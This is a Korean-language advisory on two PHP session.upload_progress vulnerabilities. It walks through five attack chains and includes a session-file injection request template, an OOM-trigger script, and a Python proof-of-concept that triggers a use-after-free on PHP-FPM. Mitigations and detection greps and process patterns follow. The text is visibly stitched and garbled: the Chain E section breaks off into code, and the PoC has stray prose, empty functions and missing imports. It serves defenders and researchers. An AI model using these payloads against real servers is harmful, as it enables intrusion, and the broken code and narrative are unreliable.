    요약

    PHP 보안팀은 2026-10-20 긴급 릴리스를 예고하고 2026-10-21 14:00 UTC에 패치를 공개했다. 두 취약점 모두 CVSS v4.0 9.2 Critical이며, 패치 커밋은 3584a98이다. 핵심은 session.upload_progress가 애플리케이션 코드보다 먼저 multipart 본문을 처리한다는 점이다. 이 기능은 PHP 5.4.0부터 기본 활성화이므로, 로그인 없이 POST를 받는 PHP endpoint 하나만 있으면 취약 코드 경로에 도달한다.

    CVE-2026-109618은 multipart 파싱 도중 memory_limit을 넘겼을 때 PHP가 longjmp()로 bailout하면서 요청 상태가 반쯤 초기화된 채 남고, Apache mod_php가 그 상태에서 조건 없이 request shutdown을 실행하는 문제다. CVE-2026-109619는 fatal error가 전역 상태 초기화를 건너뛰어, worker에 남은 전역 포인터가 이전 요청에서 해제된 메모리를 가리키는 문제다. 다음 요청이 그 포인터를 읽으면 use-after-free가 된다.

    영향 범위는 PHP 5.4.0부터 8.5.11까지다. 수정 버전은 8.2.35, 8.3.36, 8.4.27, 8.5.12다.

    영향 버전은 배포판 기준으로 확인

    운영체제와 상용 PHP 공급자는 upstream 버전 번호를 유지하면서 보안 patch를 backport할 수 있다. php --version 결과만으로 취약 여부를 단정하지 말고 패키지 changelog와 공급자 advisory를 함께 확인한다.

    자료 출처와 검증 수준

    이 문서의 기술 분석과 PoC는 두 공개 자료를 기반으로 한다. 하나는 Ahmed Sultan(0x4148)의 재현 랩 저장소이고, 다른 하나는 Qi Deng의 분석글이다. 랩은 PHP 8.4.4-fpm에서 취약 코드 경로 도달까지만 증명하고 코드 실행은 달성하지 않는다. 분석글의 체인 A~E 중 RCE 성공 주장은 저자의 로컬 환경 결과이며, PHP 공식 advisory 본문이 직접 기술한 내용과는 구분해서 읽어야 한다.

    취약점 구조

    요청 수명주기와 rfc1867

    PHP-FPM의 요청 시작 순서는 다음과 같다.

    sapi_activate()
  └─ rfc1867 콜백  ← session.upload_progress 처리 (multipart 파싱)
       └─ zend_activate_modules()
            └─ PHP_RINIT_FUNCTION(basic)   ← BG() 전역 초기화
                 └─ 애플리케이션 코드 실행

    rfc1867 콜백이 PHP_RINIT_FUNCTION(basic)보다 먼저 실행된다. 패치가 php_basic_early_rinit()을 추가해 rfc1867 앞에서 BG()를 초기화하도록 바꾼 이유가 여기에 있다. 패치 이전에는 직전 요청이 남긴 BG(unserialize) 상태가 rfc1867 단계에서 그대로 접근 가능했다.

    이 순서 때문에 다음 조건이 성립한다.

    • 인증 절차가 실행되기 전이다.
    • 애플리케이션 코드가 개입하지 않는다.
    • 공격자가 제어하는 데이터로 세션 파일이 생성된다.
    • POST를 받는 모든 PHP endpoint가 진입점이 된다.

    CVE-2026-109618 — OOM bailout 후 shutdown

    PHP는 메모리 한도 초과 시 longjmp()로 bailout한다. multipart 파싱 도중 OOM이 발생하면 init_executor를 건너뛴 채 점프하므로 EG() 전역이 초기화되지 않은 상태로 남는다. error handler, object store, exception 상태가 여기 포함된다.

    Apache mod_php는 request startup이 실패해도 request shutdown 절차를 조건 없이 실행한다. 그래서 초기화되지 않은 EG()를 shutdown 코드가 읽는다. 이 과정은 애플리케이션 코드가 시작되기 전에 전부 끝난다.

    패치에서 드러난, OOM bailout 이후 잔존하던 필드는 다음과 같다.

    • EG(user_error_handler), EG(user_exception_handler)
    • EG(errors), EG(num_errors)
    • EG(objects_store).object_buckets
    • BG(serialize), BG(unserialize)

    CVE-2026-109619 — 요청 간 전역 상태 잔존

    PHP worker는 요청 사이에 전역 상태를 유지한다. 정상 종료 경로에서는 shutdown이 이를 정리하지만, fatal error(OOM 포함)는 그 정리를 건너뛴다. 결과적으로 worker의 전역이 이전 요청에서 해제된 메모리를 가리킨 채 다음 요청을 맞는다. 다음 요청이 그 포인터를 읽으면 use-after-free다.

    FPM처럼 worker가 장시간 재사용되는 배포 모델에서 영향이 크다. 공격자는 같은 worker에 두 요청을 순서대로 보내 producer와 consumer 역할을 나눌 수 있다.

    세션 파일 기록 경로

    MULTIPART_EVENT_FORMDATA 처리기는 POST 본문의 세션 ID를 session.use_only_cookies 설정과 무관하게 받아들인다.

    /* ext/session/session.c — MULTIPART_EVENT_FORMDATA */
if (name_len == progress->sname_len &&
    memcmp(data->name, PS(session_name), name_len) == 0) {
    ZVAL_STRINGL(&progress->sid, (*data->value), value_len);
    /* use_only_cookies 검사 없음 */
}

    업로드 파일명은 세션 파일에 가공 없이 저장된다. 인코딩도 치환도 없다. 세션 ID를 공격자가 정하고 파일명에 임의 바이트를 넣을 수 있으므로, 경로와 내용이 모두 예측 가능한 파일이 서버에 생성된다.

    공격 체인

    Qi Deng의 분석글은 다섯 갈래를 제시한다. 배포 형태별로 어느 갈래가 유효한지 정리한다.

    체인 대상 추가 조건
    A. 세션 고정 + 파일명 주입 모든 PHP LFI sink 존재
    B. var_destroy 재진입 UAF 역직렬화 사용 앱 unserialize 진입점
    C. 세션 핸들러 불일치 공유 호스팅 디렉터리별 serialize handler 차이
    D. OOM 손상 Apache mod_php 없음
    E. FPM 세션 OOM PHP-FPM 큰 세션 파일 생성 가능

    Chain A — 세션 고정과 파일명 주입

    공격자가 POST 본문의 PHPSESSID 필드로 세션 ID를 고정하고, 업로드 파일명 자리에 임의 문자열을 넣는다. 파일명이 세션 파일에 그대로 기록되므로 sess_<SID> 경로에 공격자 데이터가 남는다. 애플리케이션에 파일 포함 취약점이 있으면 그 파일이 포함되면서 내용이 해석된다.

    메모리 손상이 전혀 필요 없는 경로다. 성립 조건은 네 가지다.

    1. session.upload_progress.enabled = On (기본값)
    2. 경로가 사용자 입력에 영향받는 include/require 존재
    3. 세션 저장 경로를 알거나 추측 가능 (/tmp, /var/lib/php/sessions)
    4. session.use_only_cookies = 0 또는 공격자가 쿠키를 설정 가능

    요청 구조는 다음과 같다. filename 값이 세션 파일에 그대로 남는 지점이 핵심이다.

    POST /index.php HTTP/1.1
Host: target
Cookie: PHPSESSID=<SID>
Content-Type: multipart/form-data; boundary=AAABBBCCC
Content-Length: <len>

--AAABBBCCC
Content-Disposition: form-data; name="PHPSESSID"

<SID>
--AAABBBCCC
Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"

x
--AAABBBCCC
Content-Disposition: form-data; name="f"; filename="<임의 바이트열>"

Z
--AAABBBCCC--

    이후 LFI sink에 <session_path>/sess_<SID> 경로를 넘기면 해당 파일이 포함된다. 전체 익스플로잇 코드는 Qi Deng 분석글의 exploit_session_inject.py 절에 있다.

    Chain B — var_destroy 재진입 use-after-free

    ext/standard/var_unserializer.re의 var_destroy는 두 단계로 동작한다. 245행에서 역참조 확장 청크를 efree_size()로 해제하고, 310행에서 i_zval_ptr_dtor(zv)를 호출한다. 두 번째 단계는 BG(serialize_lock) 없이 실행된다.

    이 시점에 __destruct가 실행되고 그 소멸자가 다시 unserialize()를 호출하면, 안쪽 파서가 바깥쪽의 var_hash를 재사용한다. 안쪽에서 역참조를 걸면 이미 해제된 확장 청크를 따라간다. ASAN 결과는 다음과 같다.

    ERROR: AddressSanitizer: heap-use-after-free
READ of size 8 at 0xfffff0cb6900 thread T0
    #0 php_var_unserialize at var_unserializer.c:851
    #13 var_destroy at var_unserializer.c:310
freed at:
    #3 var_destroy at var_unserializer.c:245

    분석글 저자는 이 UAF를 /proc/self/mem 쓰기와 결합해 내장 함수의 핸들러 포인터를 덮는 방식으로 코드 실행까지 이었다. 해당 단계는 로컬 PHP 실행 권한과 /proc/self/mem 접근을 전제하므로, 원격 단독 경로가 아니라 권한 상승 성격에 가깝다.

    Chain C — 세션 핸들러 불일치

    같은 서버의 두 디렉터리가 .user.ini로 서로 다른 session.serialize_handler를 쓰면, 어느 디렉터리가 요청을 처리했는지에 따라 세션 파일 형식이 달라진다.

    php_serialize 형식으로 기록된 데이터를 php 핸들러가 읽으면, 파일명에 들어간 | 문자가 형식 불일치를 만든다. php 핸들러는 |에서 키와 값을 가르고 뒤쪽을 역직렬화한다.

    핵심은 디코드가 실패해도 소멸자가 실행된다는 점이다. PHP_VAR_UNSERIALIZE_DESTROY(var_hash) 정리는 성공 경로와 실패 경로 양쪽에서 실행된다.

    garbage|O:4:"Evil":1:{s:3:"cmd";s:N:"...";}TRAILING_JUNK
       ^                                   ^
       php 핸들러가 여기서 분리            남은 데이터 때문에 FAILURE
       뒤쪽 객체는 역직렬화됨              그러나 __destruct는 이미 실행

    FPM worker가 재사용되는 환경에서는 ini_set('session.serialize_handler','php_serialize')를 호출하는 endpoint 하나만 있어도 worker 상태가 오염된다. Laravel과 Symfony를 비롯한 여러 프레임워크가 이 호출을 사용한다. 실제 공격에는 대상 애플리케이션에 자동 로드되는 __destruct 가젯이 필요하다.

    Chain D — OOM 손상, 선행 조건 없는 원격 공격

    Apache mod_php 환경에서 애플리케이션 의존성이 전혀 없는 경로다. 공식 advisory는 이렇게 기술한다.

    Apache mod_php unconditionally invokes the request shutdown procedure, even when request startup has failed. This happens entirely before any application-specific code begins execution.

    진행 순서는 다음과 같다.

    1. multipart POST로 memory_limit을 소진시킨다.
    2. 파싱 도중 OOM이 발생하고 longjmp() bailout이 init_executor를 건너뛴다.
    3. EG() 전역이 초기화되지 않은 채 남는다.
    4. mod_php가 shutdown을 실행하며 그 전역을 읽는다.
    5. heap 배치를 맞추면 읽는 값이 제어 가능해진다.

    advisory가 제시하는 OOM 유도 방식은 세 가지다.

    • Content-Length 생략: post_max_size 검사를 우회해 본문 길이 제한 없이 보낸다.
    • part 헤더 무제한: multipart part마다 헤더 수에 제한이 없고, 헤더 하나가 전송 바이트보다 약 4배의 PHP 메모리를 쓴다.
    • 빈 파일 컨트롤과 중첩 이름: 빈 파일 컨트롤은 max_file_uploads에 계산되지 않고, 중첩 배열 이름은 메모리 사용을 배수로 늘린다.

    OOM 조건 자체는 평범한 대량 필드 전송으로도 재현된다. 분석글의 확인용 스크립트는 100KB 필드를 memory_limit 기준으로 계산한 개수만큼 보낸다.

    # 출처: Qi Deng, exploit_oom_modphp.py (OOM 조건 확인 부분)
num_fields = max(50, (memory_limit_mb * 1024 * 1024) // 100000 + 100)
field_size = 100000  # part 하나당 100KB

parts = []
for i in range(num_fields):
    parts.append(
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="v{i}"\r\n'
        f"\r\n"
        f"{'X' * field_size}\r\n"
    )
parts.append(f"--{boundary}--\r\n")

    응답으로 다음이 돌아오면 bailout이 실행된 것이다.

    Fatal error: Allowed memory size of 33554432 bytes exhausted

    이 지점 이후 mod_php shutdown이 잔존 EG() 위에서 동작한다. 실제 코드 실행에는 heap 배치 조정이 추가로 필요하며, 위 스크립트는 OOM 조건 도달까지만 확인한다.

    Chain E — FPM 세션 디코드 OOM과 BG 잔존

    FPM을 겨냥한 변형이다. 앞서 정리한 요청 시작 순서의 간격을 이용한다.

    Producer 요청: 약 30MB 크기의 세션 파일을 가리키는 쿠키로 session_start()를 호출하는 endpoint를 친다. 디코드 중 php_var_unserialize에서 OOM이 발생한다. longjmp bailout이 PHP_VAR_UNSERIALIZE_DESTROY를 건너뛰므로 BG(unserialize).level이 1로 남는다. OOM이 startup이 아니라 애플리케이션 코드에서 났으므로 worker는 살아남는다.

"""
PHP2Shell PoC - CVE-2026-109618 / CVE-2026-109619
Use-After-Free via session.upload_progress Stale Pointer Write

Author: Ahmed Sultan (0x4148)

Demonstrates that the cached zval* pointers in PHP's rfc1867 upload
progress handler become stale after a re-initialization triggered by
a timed stall between FILE_DATA events.  This PoC proves the
vulnerable code path is reachable on stock PHP-FPM (no ASAN, no
debug build) by:

  1. Sending a multipart POST with PHPSESSID + PHP_SESSION_UPLOAD_PROGRESS
  2. Delivering file data in two bursts separated by a stall > min_freq
  3. Observing that the session contains upload_progress with
     bytes_processed values written through the cached (stale) pointers

The stale pointers (session.c:3292, 3318) point into a HashTable arData
that was freed by php_session_track_init() during re-initialization
(session.c:236-252).  Without a heap groom, the freed region is still
mapped, so the write is silent.

Tested against: PHP 8.4.4-fpm (bookworm), nginx with
                fastcgi_request_buffering off

Usage:
    python3 php2shell_poc.py                          # default target
    python3 php2shell_poc.py -t 127.0.0.1 -p 19268    # custom host/port
    python3 php2shell_poc.py --stall 2.0 --rounds 5   # tuning
    python3 php2shell_poc.py --verify                 # verify + diagnose

For educational / lab use only.
"""

import argparse
import http.client
import json
import os
import socket
import struct
import sys

# ---------- constants --------------------------------------------------

FILLUNIT = 5120   # rfc1867.c read-buffer size
BOUNDARY = b"----0x4148php2shell"
PROGRESS_KEY = "vuln_test"

# ---------- multipart builder ------------------------------------------

def craft_multipart(session_id: str, file_size_phase1: int, file_size_phase2: int):
    """
    Build a two-phase multipart/form-data body.

    Phase 1 contains:
      - PHPSESSID field  (binds session)
      - PHP_SESSION_UPLOAD_PROGRESS field  (arms the rfc1867 callback)
      - Start of file part + first data chunk

    Phase 2 contains:
      - Second data chunk (triggers FILE_DATA after the stall)
      - Closing boundary

    The split is designed so that phase 1 causes FILE_START + first
    FILE_DATA (caching the zval* pointers at session.c:3292/3318),
    and after the stall, phase 2's FILE_DATA fires update() which
    calls php_session_initialize() -> track_init(), freeing the
    HashTable that the cached pointers reference.
    """
    hdr  = b"--" + BOUNDARY + b"\r\n"
    hdr += b'Content-Disposition: form-data; name="PHPSESSID"\r\n\r\n'
    hdr += session_id.encode() + b"\r\n"

    hdr += b"--" + BOUNDARY + b"\r\n"
    hdr += b'Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"\r\n\r\n'
    hdr += PROGRESS_KEY.encode() + b"\r\n"

    hdr += b"--" + BOUNDARY + b"\r\n"
    hdr += b'Content-Disposition: form-data; name="file"; filename="poc.bin"\r\n'
    hdr += b"Content-Type: application/octet-stream\r\n\r\n"

    chunk_a = os.urandom(file_size_phase1)
    chunk_b = os.urandom(file_size_phase2)
    tail    = b"\r\n--" + BOUNDARY + b"--\r\n"

    phase1 = hdr + chunk_a
    phase2 = chunk_b + tail
    total  = len(phase1) + len(phase2)

    return phase1, phase2, total


# ---------- raw-socket HTTP sender -------------------------------------

def open_tcp(host: str, port: int, timeout: float = 15.0) -> socket.socket:
    sock = socket.create_connection((host, port), timeout=timeout)
    sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
    return sock


def send_phase(sock: socket.socket, data: bytes):
    """Send data, retrying on partial writes."""
    view = memoryview(data)
    sent = 0
    while sent < len(data):
        n = sock.send(view[sent:])
        if n == 0:
            raise ConnectionError("socket closed during send")
        sent += n


def recv_response(sock: socket.socket, timeout: float = 8.0) -> bytes:
    sock.settimeout(timeout)
    parts = []
    while True:
        try:
            chunk = sock.recv(65536)
        except socket.timeout:
            break
        if not chunk:
            break
        parts.append(chunk)
    return b"".join(parts)


def parse_http_status(raw: bytes) -> tuple:
    """Return (status_code, reason, body)."""
    if b"\r\n" not in raw:
        return (0, "no response", b"")
    status_line = raw.split(b"\r\n", 1)[0].decode("latin-1", "replace")
    parts = status_line.split(" ", 2)
    code = int(parts[1]) if len(parts) >= 2 and parts[1].isdigit() else 0
    reason = parts[2] if len(parts) >= 3 else ""
    body = raw.split(b"\r\n\r\n", 1)[-1] if b"\r\n\r\n" in raw else b""
    return (code, reason, body)

    Handles chunked transfer-encoding from nginx.

# ---------- core trigger -----------------------------------------------

def trigger_once(host, port, stall, monitor=False, verbose=False):
    """
    Fire one attempt.  Returns a dict:
      { "sid": ..., "armed": bool, "bytes_processed": int|None,
        "status": int, "crashed": bool }
    """
    sid = f"ph2sh_{uuid.uuid4().hex[:16]}"
    p1_size = FILLUNIT + 128   # enough to cross one FILLUNIT read
    p2_size = FILLUNIT * 2     # two more reads -> second FILE_DATA event

    phase1, phase2, total_len = craft_multipart(sid, p1_size, p2_size)

    request_line = (
        f"POST /index.php HTTP/1.1\r\n"
        f"Host: {host}:{port}\r\n"
        f"Cookie: PHPSESSID={sid}\r\n"
        f"Content-Type: multipart/form-data; boundary={BOUNDARY.decode()}\r\n"
        f"Content-Length: {total_len}\r\n"
        f"Connection: close\r\n"
        f"\r\n"
    ).encode()

    sock = open_tcp(host, port)

    # --- Phase 1: arm the cached pointers ---
    send_phase(sock, request_line + phase1)
    if verbose:
        print(f"    [>] Phase 1 sent: {len(phase1)} bytes "
              f"(file data triggers FILE_START + FILE_DATA)")

    # --- Stall: wait > min_freq so the next update() re-initializes ---
    session_data = {}
    if monitor:
        time.sleep(0.4)
        session_data = read_session(host, port, sid)
        remaining = max(0, stall - 0.4)
        time.sleep(remaining)
    else:
        time.sleep(stall)

    # --- Phase 2: write after re-initialization ---
    send_phase(sock, phase2)
    if verbose:
        print(f"    [>] Phase 2 sent: {len(phase2)} bytes "
              f"(FILE_DATA writes through cached zval*)")

    raw = recv_response(sock)
    try:
        sock.close()
    except Exception:
        pass

    code, reason, body = parse_http_status(raw)

    armed = False
    bp_val = None
    progress_key = f"upload_progress_{PROGRESS_KEY}"

    if session_data and progress_key in session_data:
        armed = True
        bp_val = session_data[progress_key].get("bytes_processed")

    crashed = code in (0, 502, 503) or not raw

    return {
        "sid": sid,
        "armed": armed,
        "bytes_processed": bp_val,
        "session": session_data,
        "status": code,
        "reason": reason,
        "crashed": crashed,
    }

def http_connect(host, port):

def http_read(s, timeout=10):

    while True:
        try:
            d = s.recv(65536)
        except socket.timeout:
            break
        if not d:
            break
        resp += d
    s.close()
    return resp

    임시 노출 축소

    업데이트가 유일한 완전 해결책이다. 아래 설정은 체인 A·B·C·E의 진입점을 막지만, 체인 D는 Zend 코어의 OOM 처리 문제이므로 막지 못한다.

    session.upload_progress.enabled = Off
session.use_only_cookies = On

    session.upload_progress.enabled = Off는 rfc1867 콜백을 통째로 비활성화한다. multipart 파서는 계속 동작하지만 세션 진행률 포인터가 설정되지 않는다. 업로드 진행률 표시 기능을 쓰는 애플리케이션이 있는지 확인하고 적용한다.

    session.use_only_cookies = On은 POST 본문을 통한 세션 ID 고정을 막는다. 다만 rfc1867 처리기의 MULTIPART_EVENT_FORMDATA 경로가 이 설정을 검사하지 않는 것이 취약점의 일부이므로, 애플리케이션 수준 방어로만 간주한다.

    nginx를 쓴다면 요청 본문 버퍼링을 켜 둔다. 기본값이며, 정지 기반 트리거가 FPM에 전달되는 것을 막는다.

    fastcgi_request_buffering on;
proxy_request_buffering on;

    그 밖에 PHP가 직접 처리하는 요청의 범위를 줄인다.

    • 외부에 노출할 필요가 없는 PHP endpoint를 reverse proxy 또는 웹 서버에서 차단한다.
    • 업로드 endpoint의 요청 본문 크기와 multipart part 수를 제한한다.
    • Content-Length 없는 POST와 과도한 chunked 요청을 프록시에서 거부한다.
    • 관리용 PHP endpoint는 네트워크 접근 제어 뒤로 이동한다.
    • 불필요한 CGI handler와 사용하지 않는 SAPI를 비활성화한다.
    • PHP worker 권한과 웹 루트 쓰기 권한을 최소화한다.
    • 세션 저장 경로를 웹 루트 밖에 두고 디렉터리 목록 노출을 막는다.

    요청 크기 제한은 체인 D의 OOM 유도를 어렵게 만들지만, part 헤더 증폭과 중첩 배열 이름은 전송 바이트 대비 메모리 사용이 크므로 크기 제한만으로 안전하다고 볼 수 없다.

    요청 패턴

    업로드 진행률 기능을 쓰지 않는 서비스라면 다음 요청은 그 자체로 비정상이다.

    • 본문에 PHP_SESSION_UPLOAD_PROGRESS 필드를 포함한 multipart POST
    • 쿠키가 아니라 POST 본문에 PHPSESSID 필드를 넣은 요청
    • 업로드 파일명에 <?php, |O:, |a:, 널 바이트, 개행이 들어간 multipart

    • 같은 boundary로 수백 개 이상 필드를 담은 POST
    • 본문 전송이 중간에 1초 이상 멈췄다 재개되는 업로드

    마지막 항목은 정지 기반 트리거의 특징이다. 정상 업로드도 네트워크 사정으로 끊길 수 있으므로 단독 판정 근거로 쓰지 않는다. 같은 세션 ID로 짧은 간격에 반복되는 경우를 본다.

    세션 저장 경로

    파일명이 가공 없이 기록되므로 세션 파일 내용이 직접적인 증거가 된다.

    grep -rlE '<\?php|\|O:[0-9]+:|\|a:[0-9]+:' /var/lib/php/sessions/ 2>/dev/null
find /var/lib/php/sessions /tmp -name 'sess_*' -newermt '2026-10-20' -ls

    upload_progress_ 접두사가 붙은 항목이 애플리케이션이 쓰지 않는 키 이름으로 생성됐는지 확인한다.

    grep -rl 'upload_progress_' /var/lib/php/sessions/ 2>/dev/null

    엔드포인트

    PHP worker가 생성한 자식 프로세스를 우선 조사한다.

    php-fpm | php-cgi | apache2 | httpd | lsphp
    -> sh | bash | dash | cmd.exe | powershell.exe
    -> curl | wget | certutil.exe
    -> python | perl | node

    추가 확인 대상은 다음과 같다.

    • PHP worker 계정으로 생성되거나 변경된 파일
    • 웹 루트 밖에 기록된 스크립트와 실행 파일
    • 임시 디렉터리에서 실행된 바이너리
    • 서비스 계정의 예약 작업, 시작 프로그램 또는 SSH key 변경
    • PHP worker에서 시작된 shell과 다운로드 도구
    • /proc/self/mem 접근 흔적

    Linux에서는 프로세스 실행과 파일 변경 기록을 조회한다.

    journalctl --since '2026-10-20' |
  grep -Ei 'php|segfault|oom|fatal|killed process'

find /var/www /tmp /var/tmp -type f -newermt '2026-10-20' -ls

    서버 로그

    PHP와 웹 서버 로그에서 다음 사건의 시간 관계를 확인한다.

    • Allowed memory size of N bytes exhausted 다수 발생
    • Error in Request Startup 또는 rfc1867 단계 오류
    • Session object destruction failed, Failed to decode session object
    • segmentation fault 또는 access violation
    • PHP worker의 비정상 종료와 반복 재시작
    • OOM killer 또는 메모리 제한 오류
    • FPM pool의 급격한 worker 교체
    • 웹 서버의 5xx 응답 증가
    journalctl -u php-fpm --since '2026-10-20'
journalctl -u apache2 --since '2026-10-20'
journalctl -u httpd --since '2026-10-20'
dmesg --ctime | grep -Ei 'segfault|oom|killed process|php'

grep -E 'memory size of [0-9]+ bytes exhausted' /var/log/php-fpm/php_errors.log
grep -E 'Request Startup|destruction failed|Failed to decode session' /var/log/php-fpm/php_errors.log

    메모리 소진 오류가 평소 없던 endpoint에서 갑자기 반복된다면 체인 D 또는 E의 producer 단계로 본다. 특히 같은 소스 주소에서 메모리 소진 직후 PHP_SESSION_UPLOAD_PROGRESS 요청이 이어지는 패턴은 체인 E의 producer와 consumer 조합과 일치한다.

    단일 crash는 공격의 증거가 아니다. reverse proxy 로그의 요청 시각, PHP 오류, worker 재시작, 세션 파일 생성, 자식 프로세스 실행, 파일 변경, 외부 통신을 하나의 타임라인으로 결합한다.
